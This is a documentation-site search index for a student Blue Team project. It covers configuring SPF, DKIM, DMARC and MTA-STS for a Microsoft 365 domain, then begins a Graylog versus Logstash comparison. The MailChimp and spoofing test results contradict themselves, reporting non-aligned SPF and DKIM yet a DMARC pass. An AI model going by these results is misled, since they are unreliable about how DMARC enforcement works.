4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#103-anti-malware-policy","content":"   ","version":"Next","tagName":"h3"},{"title":"10.4. Safe Attachments Policy​","type":1,"pageTitle":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#104-safe-attachments-policy","content":"   ","version":"Next","tagName":"h3"},{"title":"10.5. Safe Links Policy​","type":1,"pageTitle":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#105-safe-links-policy","content":"   ","version":"Next","tagName":"h3"},{"title":"10.6. Common Attachment Types Filtering Policy​","type":1,"pageTitle":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#106-common-attachment-types-filtering-policy","content":"   ","version":"Next","tagName":"h3"},{"title":"10.7. Connection Filtering Policy​","type":1,"pageTitle":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#107-connection-filtering-policy","content":"   ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"Phase 4 – Additional security controls based on the CIS Foundations Benchmark guidelines","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase4#references","content":" Microsoft Admin CenterCIS Benchmark – Microsoft 365Redback Cyber GitHub Repo - Additional CIS Security Controls - Email &amp; Collaboration.ps1 ","version":"Next","tagName":"h2"},{"title":"Phase 3 – SPF, DKIM and DMARC Implementation","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3","content":"","keywords":"","version":"Next"},{"title":"Objective​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#objective","content":" The objective of this phase is to implement and validate the e-mail authentication security protocols to prevent spoofing, phishing, and unauthorized use of the domain. This phase focuses on:  Configuration, validation and functional testing of SPF, DKIM, and DMARC protocols.Email domain authentication and compliance with ISM controls.  ","version":"Next","tagName":"h2"},{"title":"Deliverables​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#deliverables","content":" Configured SPF, DKIM, and DMARC.Validated SPF, DKIM, and DMARC to ensure proper implementation.    ","version":"Next","tagName":"h2"},{"title":"SPF, DKIM, and DMARC: Overview of Email Authentication Protocols​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#spf-dkim-and-dmarc-overview-of-email-authentication-protocols","content":" ","version":"Next","tagName":"h2"},{"title":"1. SPF (Sender Policy Framework)​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#1-spf-sender-policy-framework","content":" An email authentication protocol that verifies whether the sender is authorized to send emails on behalf of a domain.Detects spoofed emails by specifying a list of hosts or IP addresses allowed to send emails on behalf of a specific domain or subdomain.Any senders (hosts or IP addresses) not listed in the SPF records fail verification, ensuring that only trusted senders can send emails using the domain.Implementation of SPF addresses the following ISM Controls: ISM-0574: Specifies authorized email servers (or lack thereof) for an organisation’s domains (including subdomains).ISM-1183: Enforces a hard fail SPF record for domains (including subdomains).ISM-1151: Verifies the authenticity of incoming emails.  ","version":"Next","tagName":"h3"},{"title":"2. DKIM (DomainKeys Identified Mail)​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#2-dkim-domainkeys-identified-mail","content":" An email authentication protocol that adds a digital signature to emails, verifying the sender’s identity and preventing email tampering.Detects spoofed email content.A public key is published in the domain’s DNS and is used to validate the digital signature in an email. If the signed digest does not match the email content, DKIM verification fails.Implementation of DKIM addresses the following ISM Controls: ISM-0861: Enables DKIM signing for outgoing emails.ISM-1026: Verifies DKIM signatures on incoming emails.ISM-1027: Configures email distribution list software to preserve DKIM signatures.  ","version":"Next","tagName":"h3"},{"title":"3. DMARC (Domain-based Message Authentication, Reporting, and Conformance)​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#3-dmarc-domain-based-message-authentication-reporting-and-conformance","content":" An email authentication protocol that provides a policy framework for enforcing SPF and DKIM checks and generating reports on email authentication results.Works with SPF and DKIM to authenticate emails and specify actions for suspicious emails: The domain owner publishes a DMARC DNS record.The recipient mail server performs SPF and DKIM authentication and alignment tests, then applies the sender’s DMARC policy: none – No action.quarantine – Emails are marked as spam.reject – Emails are rejected. Generates DMARC Aggregate Reports detailing the authentication checks. Implementation of DMARC addresses the following ISM Controls: ISM-1540: Configures DMARC records for domains to reject emails failing DMARC checks.ISM-1799: Rejects incoming emails failing DMARC checks.    ","version":"Next","tagName":"h3"},{"title":"7. Email Authentication Protocols Implementation (SPF, DKIM, DMARC)​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#7-email-authentication-protocols-implementation-spf-dkim-dmarc","content":" Ensure the following DNS records are published:  Protocol\tRecord Type\tName/Host\tValueSPF\tTXT\t@\tv=spf1 include:spf.protection.outlook.com -all DKIM\tCNAME\tselector1._domainkey\tselector1-redbackops-com._domainkey.6wz4nv.onmicrosoft.com DKIM\tCNAME\tselector2._domainkey\tselector2-redbackops-com._domainkey.6wz4nv.onmicrosoft.com DMARC\tTXT\t_dmarc\tv=DMARC1; p=reject; pct=100; fo=1; rua=mailto:blueteam@redbackops.com,mailto:dmarc_agg@vali.email; ruf=mailto:blueteam@redbackops.com,mailto:dmarc_agg@vali.email;  ","version":"Next","tagName":"h2"},{"title":"7.1. Configure SPF​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#71-configure-spf","content":" From the table above, add the corresponding TXT record to the domain’s DNS (if not already added in Phase 2).  ","version":"Next","tagName":"h3"},{"title":"7.2. Enable DKIM Signing​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#72-enable-dkim-signing","content":" From the table above, add the corresponding CNAME records to the domain’s DNS.Run the PowerShell scripts sequentially to enable DKIM signing and generate the selector CNAME records.PowerShell Script: Configure DKIM for Mail Signing  ","version":"Next","tagName":"h3"},{"title":"7.3. Implement DMARC​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#73-implement-dmarc","content":" 7.3.1. Configure DMARC Policy  From the table above, add the corresponding TXT record to the domain’s DNS.Information on DMARC tags: DMARC Tags.    7.3.2. Configure DMARC Monitoring and Reporting Use Valimail for DMARC monitoring and reporting:  rua=mailto:dmarc_agg@vali.emailruf=mailto:dmarc_agg@vali.email    ","version":"Next","tagName":"h3"},{"title":"8. Email Authentication Protocols Validation (SPF, DKIM, DMARC)​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#8-email-authentication-protocols-validation-spf-dkim-dmarc","content":" ","version":"Next","tagName":"h2"},{"title":"8.1. Using Online Tools (e.g., MXToolbox)​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#81-using-online-tools-eg-mxtoolbox","content":" 8.1.1. Validate SPF record.   8.1.2. Validate DKIM signing.   8.1.3. Validate DMARC record.  ","version":"Next","tagName":"h3"},{"title":"8.2. Using nslookup​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#82-using-nslookup","content":" 8.2.1. Validate SPF record: nslookup -type=TXT redbackops.com  8.2.2. Validate DKIM signing: nslookup -type=CNAME selector1._domainkey.redbackops.com nslookup -type=CNAME selector2._domainkey.redbackops.com  8.2.3. Validate DMARC record: nslookup -type=txt _dmarc.redbackops.com    ","version":"Next","tagName":"h3"},{"title":"8.3. Email Authentication Protocols Functional Test (SPF, DKIM, DMARC)​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#83-email-authentication-protocols-functional-test-spf-dkim-dmarc","content":" ","version":"Next","tagName":"h2"},{"title":"3.3.1. Send test e-mail.​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#331send-test-e-mail","content":" Send a test e-mail using a redbackops.com email account (e.g., adm-redbackops@redbackops.com) through Outlook and checking e-mail headers.  Validate SPF record.Validate DKIM signing.Validate DMARC record.  RESULT:  SPF: Pass. The authenticated domain (redbackops.com) aligns with the From domain (redbackops.com).DKIM: Pass. The signing domain (redbackops.com) aligns with the From domain (redbackops.com).DMARC: Pass. Since both SPF and DKIM align, DMARC validation passes, and the email gets delivered without any issues.     ","version":"Next","tagName":"h3"},{"title":"3.3.2. Send a test-email using a third-party email service provider.​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#332-send-a-test-email-using-a-third-party-email-service-provider","content":" Set up a MailChimp account and send an email using a redbackops.com email account (e.g., marketing@redbackops.com).     RESULT:  SPF: Pass, but the domain (mail250.suw18.rsgsv.net) does not align with the From domain (redbackops.com) as MailChimp’s mail server.DKIM: PassPass, but the signing domains (mcc.mcsv.net and mailchimpapp.net) do not align with the From domain (redbackops.com).DMARC: Pass. Since both SPF and DKIM align, DMARC validation passes, and the email gets delivered without any issues.  ","version":"Next","tagName":"h3"},{"title":"3.3.3. Perform a spoofing test.​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#333perform-a-spoofing-test","content":" Perform a spoofing test using online tools such as DMARCTester .  RESULT:  SPF: Pass, but the domain (evil.example.net) does not align with the From domain (redbackops.com) as MailChimp’s mail server.DKIM: PassPass, but the signing domain (evil.example.net) does not align with the From domain (redbackops.com).DMARC: Pass. Since both SPF and DKIM align, DMARC validation passes, and the email gets delivered without any issues.       ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"Phase 3 – SPF, DKIM and DMARC Implementation","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase3#references","content":" Australian Cyber Security Centre - Email Security GuidelinesMXToolbox - What is DMARC?PowerDMARC - All About SPF, DKIM, and DMARCMicrosoft Hosted Apps (MHA)DMARC Tester ","version":"Next","tagName":"h2"},{"title":"Phase 5 – Additional Security Controls","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5","content":"","keywords":"","version":"Next"},{"title":"Objective​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#objective","content":" The objective of this phase is to further implement advanced email, identity and communication security controls to safeguard Redback Operations’ email and identity infrastructure against phishing, credential abuse, and unauthorised access.  This phase focuses on enforcing sender filtering, identity protection, auditing and logging, and encrypted email transmission as per industry best practices.    ","version":"Next","tagName":"h2"},{"title":"Deliverables​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#deliverables","content":" Outlined below are the security controls that have been implemented and validated in this phase.  Controls 12, 13, 14 and 15 were implemented and validated using PowerShell, which can be found in the ‘redback-cyber’ GitHub repository (link below): Control 12–14: Set-MailflowSecurity-AuditControls-Phase5.ps1Control 15: Set-MFAEnforcement-AllUsers-Phase5.ps1  Control #\tControl Name\tControl Description12\tBlock Malicious Senders and Domains\tBlock emails from known malicious sender addresses and domains. 13\tBlock Malicious IP Addresses\tBlock threat IPs using the Exchange Online connection filter policy. 14\tEnable Email Activity Auditing and Logging\tEnable mailbox-level auditing for visibility and traceability of email activity. 15\tEnforce MFA\tRequire multi-factor authentication for all user accounts (excluding breakglass). 16\tEnforce MTA-STS\tEnforce strict TLS encryption using MTA-STS and TLS-RPT policy.    ","version":"Next","tagName":"h2"},{"title":"Important Notes​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#important-notes","content":" For controls 12, 13, and 14:  Installed the ExchangeOnlineManagement PowerShell moduleSet execution policy to ‘Bypass’ for the current sessionImported the ExchangeOnlineManagement PowerShell moduleConnected using an account with 'Global Administrator', 'Exchange Administrator' or ‘Security Administrator’ permissions    For control 15:  Installed Microsoft Graph SDK PowerShell moduleSet execution policy to ‘Bypass’ for the current sessionImported the required Microsoft Graph SDK PowerShell moduleConnected using an account with 'Global Administrator' permission with the required scope      ","version":"Next","tagName":"h2"},{"title":"12. Block Emails from Malicious Senders and Sender Domains (via Mail Flow Rule)​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#12-block-emails-from-malicious-senders-and-sender-domains-via-mail-flow-rule","content":" ","version":"Next","tagName":"h2"},{"title":"12.1. IMPLEMENT​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#121-implement","content":"   ","version":"Next","tagName":"h3"},{"title":"12.2. VALIDATE​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#122-validate","content":"      ","version":"Next","tagName":"h3"},{"title":"13. Block Emails from Malicious IP Addresses (via Connection Filtering Policy)​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#13-block-emails-from-malicious-ip-addresses-via-connection-filtering-policy","content":" ","version":"Next","tagName":"h2"},{"title":"13.1. IMPLEMENT​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#131-implement","content":"   ","version":"Next","tagName":"h3"},{"title":"13.2. VALIDATE​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#132-validate","content":"      ","version":"Next","tagName":"h3"},{"title":"14. Enable Email Activity Logging and Auditing for all Mailboxes​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#14-enable-email-activity-logging-and-auditing-for-all-mailboxes","content":" ","version":"Next","tagName":"h2"},{"title":"14.1. IMPLEMENT​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#141-implement","content":"   ","version":"Next","tagName":"h3"},{"title":"14.2. VALIDATE​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#142-validate","content":"     ","version":"Next","tagName":"h3"},{"title":"15. Enforce Multi-Factor Authentication (MFA)​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#15-enforce-multi-factor-authentication-mfa","content":" ","version":"Next","tagName":"h2"},{"title":"15.1. IMPLEMENT​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#151-implement","content":"   ","version":"Next","tagName":"h3"},{"title":"15.2. VALIDATE​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#152-validate","content":"      ","version":"Next","tagName":"h3"},{"title":"16. Enforce Strict TLS Encryption via MTA-STS​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#16-enforce-strict-tls-encryption-via-mta-sts","content":" MTA-STS (Mail Transfer Agent Strict Transport Security) is an email security standard that ensures that:  Inbound emails to your domain are encrypted using TLSInbound emails are only sent to authorised mail servers (as specified in the MX record of your domain)  ","version":"Next","tagName":"h2"},{"title":"16.1. IMPLEMENT​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#161-implement","content":" 16.1.1. Host MTA-STS Policy via GitHub Pages​  You should create a GitHub repo with the structure below:  📁 redbackops-mta-sts-host/ ├── 📄 _config.yml ← includes the .well-known directory └── 📂 .well-known/ └── 📄 mta-sts.txt ← your actual MTA-STS policy file   16.1.1.1. Create a GitHub Repo (Public) • Name it: redbackops-mta-sts-host • Add a folder: .well-known/ • Inside .well-known/, create a file named: mta-sts.txt  16.1.1.2. Add MTA-STS policy to the mta-sts.txt file  version: STSv1 mode: enforce mx: *.mail.protection.outlook.com max_age: 604800     16.1.1.3. Add a _config.yml file with the following content include: [&quot;.well-known&quot;]   16.1.1.4. Enable GitHub Pages • Go to Settings -&gt; Pages • Select the branch main and root • Custom domain: mta-sts.redbackops.com • The policy will now be hosted at: https://mta-sts.redbackops.com/.well-known/mta-sts.txt   16.1.1.5. The policy will now be hosted at: https://mta-sts.redbackops.com/.well-known/mta-sts.txt   16.1.2. Add DNS Records​  16.1.2.1. Map to GitHub custom subdomain  Name: mta-sts.redbackops.com Type: CNAME Value: &lt;username&gt;.github.io     16.1.2.2. Add TXT record for _mta-sts  Name: _mta-sts.redbackops.com Type: TXT Value: v=STSv1; id=20250516T173050   Note: The id value is a timestamp string used by external mail servers to detect changes. In this case, id=20250516T173050, which can be interpreted as: • Year: 2025 • Month: 05 • Day: 16 • Hour: 17 • Minute: 30 • Second: 50  16.1.2.3. TXT record for TLS-RPT reporting  Name: _smtp._tls.redbackops.com Type: TXT Value: v=TLSRPTv1; rua=mailto:blueteam@redbackops.com   Note: This enables daily TLS report aggregates from complaint mail providers (eg, Google, Microsoft, and Yahoo)      ","version":"Next","tagName":"h3"},{"title":"16.2. VALIDATE​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#162-validate","content":" 16.2.1. Using Command Line Tools (e.g., nslookup)​  16.2.1.1. Validate DNS TXT record for _mta-sts nslookup -type=TXT _mta-sts.redbackops.com   16.2.1.2. Validate TXT record for TLS-RPT reporting nslookup -type=TXT _smtp._tls.redbackops.com   16.2.2. Using Online Tools (MXToolbox, Hardenize)​  16.2.2.1. Validate using MXToolbox   16.2.2.2. Validate using Hardenize   16.2.3. Test Email Delivery​  16.2.3.1. Send a test e-mail from a Gmail sender address (eg, redbackops24@gmail.com) to a @redbackops.com email account. 16.2.3.2. Check the e-mail headers.   16.2.3.3. RESULT – Evidence of MTA-STS Enforcement​  By design, there is no specific email header that directly shows that MTA-STS was applied because:  MTA-STS is a transport-layer security mechanismIt applies during the SMTP handshake and is not recorded in email headers  However, based on the screenshot above, it can be validated that MTA-STS was applied based on the points below:  Encryption (TLS 1.3) was used when Gmail delivered the emailThe receiving domain (redbackops.com) had: A valid _mta-sts.redbackops.com TXT recordA reachable https://mta-sts.redbackops.com/.well-known/mta-sts.txt fileAn MTA-STS policy in enforce mode Senders like Gmail support and respect MTA-STS policy if one existsIf Gmail (as the sender) was unable to establish a secure TLS connection, or if the TLS certificate on the receiving server (redbackops.com) did not match the MTA-STS policy requirements, Gmail would have refused to deliver the email because redbackops.com’s MTA-STS policy is set to enforce mode.    ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"Phase 5 – Additional Security Controls","url":"/redback-documentation/docs/cybersecurity/Blue Team/email-infra-security/phase5#references","content":" Microsoft Exchange PowerShellMicrosoft Graph PowerShell SDKMTA-STS Overview – MXToolboxMTA-STS Knowledge Base – MailhardenerGitHub Pages Hosting ReferenceMTA-STS Lookup Tool – MXToolboxTLS and MTA-STS Reporting – HardenizePowerShell Script – MFA EnforcementPowerShell Script – Mailflow &amp; Audit Controls ","version":"Next","tagName":"h2"},{"title":"Graylog and Logstash Comparative Analysis","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog and Logstash Comparative Analysis","content":"","keywords":"","version":"Next"},{"title":"Graylog vs Logstash: A Comparative Analysis​","type":1,"pageTitle":"Graylog and Logstash Comparative Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog and Logstash Comparative Analysis#graylog-vs-logstash-a-comparative-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"1.0 Introduction​","type":1,"pageTitle":"Graylog and Logstash Comparative Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog and Logstash Comparative Analysis#10-introduction","content":" Centralized log management is critical for both security monitoring and IT operations in modern systems. Graylog and Logstash are two prominent open-source tools used to collect, process, and analyze log data, each with different design philosophies. Graylog is a full-fledged log management platform (with a web interface, alerting, and storage integration), while Logstash is a log processing pipeline tool that is part of the Elastic Stack (often paired with Elasticsearch and Kibana). This report provides an academic-style comparison of Graylog and Logstash across common use cases from security log management and general-purpose log aggregation to DevOps pipeline processing and real-time analytics using key criteria: performance, ease of use, integration capabilities, cost considerations, and community support. The analysis draws on official documentation, industry reviews, and case studies to highlight each tool’s strengths and weaknesses.  ","version":"Next","tagName":"h3"},{"title":"1.1 Typical Use Cases and Applications​","type":1,"pageTitle":"Graylog and Logstash Comparative Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog and Logstash Comparative Analysis#11-typical-use-cases-and-applications","content":" Both Graylog and Logstash are versatile and support a range of logging scenarios. Below we outline how each tool is applied in typical use cases:  I. Security Log Management (SIEM): Graylog is often deployed as a lightweight Security Information and Event Management (SIEM) solution or as part of a security stack. It can ingest and correlate logs from intrusion detection systems, endpoints, and threat intelligence feeds, providing a central UI for security analysts. For example, Graylog is used alongside Wazuh (an open-source SIEM) to enhance visibility and dashboards for security alerts. Logstash, on the other hand, frequently appears in security logging pipelines as part of the Elastic Stack. Tools like Wazuh historically integrated Logstash to parse and forward security alerts into Elasticsearch. In modern setups, Logstash (or Beats) feed data to Elastic Security or other SIEM platforms for threat detection. Both tools enable real-time alerting on security events, though Graylog provides this out-of-the-box via its stream alerts, whereas Logstash requires additional components (Elasticsearch/Kibana or SIEM solutions) for alerting functionality.  II. General-Purpose Log Aggregation: In IT operations and system administration, both Graylog and Logstash are used to centralize logs from servers, applications, and network devices. Graylog offers a turnkey solution for aggregating logs from various sources (e.g. via Syslog, Beats, or Graylog’s GELF format) into a single searchable repository. Its built-in dashboards and search engine (backed by Elasticsearch) allow operators to quickly troubleshoot issues across distributed systems. Logstash serves a similar purpose in aggregation pipelines, acting as an ingest node that collects logs (from files, syslog, message queues, etc.), parses them (e.g. with grok patterns), and then ships them to a datastore like Elasticsearch. For general log aggregation, a key difference is that Graylog includes the viewing interface and user management, whereas Logstash users typically rely on Kibana or another front-end for querying and visualization.  III. DevOps Pipeline Processing: In DevOps and cloud-native environments, log and event data flow through pipelines for monitoring CI/CD processes and microservices. Logstash is widely used in these pipelines due to its flexible plugin ecosystem it can ingest CI logs, Docker/container stdout, metrics, and even events from message brokers, then filter or transform them as needed before output. DevOps teams often script Logstash configurations as part of infrastructure-as-code to route logs between systems or to Elasticsearch for analysis. Graylog can also fit into DevOps workflows; it can directly ingest container logs using the GELF driver (e.g. Docker/Swarm logging) and provides real-time dashboards to monitor application performance and deployments. Graylog’s pipeline rules allow on-the-fly parsing or enrichment of CI/CD logs like Logstash filters. However, Logstash may integrate more naturally with existing CI/CD toolchains as a background service, whereas Graylog’s value in DevOps is often in providing a quick web UI for teams to investigate build or runtime issues in real time.  IV. Real-Time Analytics: Both tools support real-time log analytics, albeit in different ways. Graylog was designed for real-time log exploration, incoming events are indexed quickly into Elasticsearch and become searchable almost immediately via Graylog’s interface. Users can set up streams (continuous queries) to route events in real time and trigger alerts or feed dashboards that update live. Graylog can even enrich data in transit (for example, tagging IP addresses with threat intelligence from MISP or VirusTotal as logs stream in).  Logstash similarly processes events in streaming fashion; it can enrich data using lookup plugins and then forward it to analytics engines. Real-time dashboards are achieved by coupling Logstash with a visualization layer like Kibana. The Elastic Stack is known to handle near-real-time analytics well, Logstash feeds events into Elasticsearch, and Kibana dashboards auto-refresh to reflect new data. The main contrast is that Graylog provides an integrated real-time analytics experience (with less than a few seconds delay for most inputs), while Logstash’s real-time analytics capabilities depend on the rest of the Elastic Stack to consume and display the data.  In summary, Graylog tends to appeal as an all-in-one solution for quickly standing up log management in scenarios like security operations or small DevOps teams, whereas Logstash excels as a flexible component in custom log pipelines, especially in large-scale deployments that already use Elasticsearch. Next, we compare the two tools on specific criteria in detail.  ","version":"Next","tagName":"h3"},{"title":"1.2 Performance​","type":1,"pageTitle":"Graylog and Logstash Comparative Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog and Logstash Comparative Analysis#12-performance","content":" Graylog: Graylog is built to handle large volumes of log data in real time, leveraging underlying Elasticsearch (or OpenSearch) for indexing and search. A single Graylog server node can ingest thousands of events per second, and Graylog’s clustered deployment can scale that out horizontally. One of Graylog’s core performance features is its internal message journal (based on Apache Kafka technology) which buffers incoming messages on disk. This journal allows Graylog to smooth out bursts of logs and protect against data loss if the backend Elasticsearch becomes slow or temporarily unreachable, Graylog will spool incoming logs to disk and catch up later. This design helps maintain throughput under stress. Graylog processes logs through pipelines and extractors, which are efficient but add a small overhead before writing to Elasticsearch. The actual indexing performance is largely dependent on the Elasticsearch/OpenSearch cluster performance. In practice, Graylog’s throughput is on par with other log systems using Elasticsearch; for instance, real-world deployments report stable performance indexing security events in near real-time on modest hardware. However, Graylog’s all-in-one nature means the server handles both ingestion and querying, so high query loads (e.g. complex searches or dashboards) can contend for resources with ingestion. Tuning the JVM, Elasticsearch indices, and using multiple Graylog nodes can mitigate this. Graylog Enterprise installations often include archiving and other features that require careful performance tuning on the Elasticsearch side. Overall, Graylog provides strong performance for log ingestion with built-in reliability, suitable for high-volume environments, but it requires sufficient backend resources (CPU, RAM, and fast disk for the journal and ES) to sustain heavy loads.  Logstash: Logstash is a robust data pipeline engine and can be optimized to handle very high event rates, but it is also known for its resource intensity. Written in Java (and some Ruby), Logstash historically had higher CPU and memory usage for equivalent tasks that lighter shippers (like Beats or Fluent Bit) could do. This led some organizations to replace or complement Logstash with lighter collectors (for example, Wazuh moved from Logstash to Filebeat for shipping alerts in later versions for efficiency). That said, Logstash excels in complex processing. It can parse and transform logs using regex, apply conditionals, and even do aggregation, which can offload work from the database at the cost of throughput. Performance tuning features in Logstash include pipeline workers (multi-threading) and persistent queues to buffer events to disk like Graylog’s journal. In a well-tuned setup (e.g. multiple pipeline threads, adequate JVM heap, and perhaps multiple Logstash instances behind a message broker), Logstash can also ingest many thousands of events per second continuously. Because Logstash is decoupled from search/query duties, it focuses purely on moving and transforming data, which can be an advantage in performance isolation. The output stage (often Elasticsearch) will still be the rate-limiter in many cases. In summary, Logstash provides high throughput and rich processing at scale, but may require more tuning and hardware (especially for CPU-intensive filters) to achieve the same raw throughput as a more lightweight pipeline. Many modern pipelines use Logstash in combination with message queues (Kafka/RabbitMQ) to distribute load. When comparing directly, Graylog’s integrated pipeline is performant and convenient, but Logstash offers more granular control to optimize for throughput or latency as needed. It’s worth noting that for simple log shipping, Graylog’s built-in inputs or alternatives like Beats/Fluent Bit can outperform a heavy Logstash, whereas for complex event processing, Logstash’s performance is acceptable given its capabilities.  ","version":"Next","tagName":"h3"},{"title":"1.3 Ease of Use​","type":1,"pageTitle":"Graylog and Logstash Comparative Analysis","url":"/redback-documentation/docs/cybersecurity/Blue Team/Graylog Setup/Graylog and Logstash Comparative Analysis#13-ease-of-use","content":" Graylog: One of Graylog’s biggest advantages is its ease of use for end-users and administrators. It provides a web-based interface out-of-the-box for managing the entire log lifecycle from defining inputs to searching logs and creating dashboards. Setting up Graylog involves installing its server (plus dependencies MongoDB for metadata and Elasticsearch for data) and then configuration is largely done via the UI. Users can add log input sources (e.g. syslog listeners, GELF inputs, Beats inputs) through point-and-click in the Graylog web console, rather than writing configuration files. The searching and analysis experience is often described as intuitive, “like being able to Google your logs in real time”. This means that even non-developers (e.g. security analysts, SREs) can quickly start querying logs with Graylog’s Lucene-based search syntax and use its built-in functions (like quick filters or field statistics). Graylog also has built-in user management and role-based access control, making it easier to securely share the platform across teams. Creating dashboards and alerts in Graylog is done through the UI with minimal scripting. Moreover, Graylog’s content packs provide pre-made configurations (inputs, extractors, dashboards) for common log sources, which further simplifies setup for new users. The learning curve for Graylog is generally considered low for basic log viewing and moderate for advanced features (e.g. writing pipeline rules requires some scripting knowledge, but the GUI aids in debugging them). In summary, Graylog is designed to be user-friendly, offering a shorter time-to-value in deploying a log management solution. Its self-contained web UI for configuration and analysis is a key selling point, especially for teams who want to avoid dealing with multiple configuration files and tools.  Logstash: Logstash is powerful but often less approachable for beginners when used standalone. As a backend component, Logstash does not include a user interface; deploying it and using it involves writing configuration files (in a domain-specific language) to define pipelines of inputs → filters → outputs. Setting up 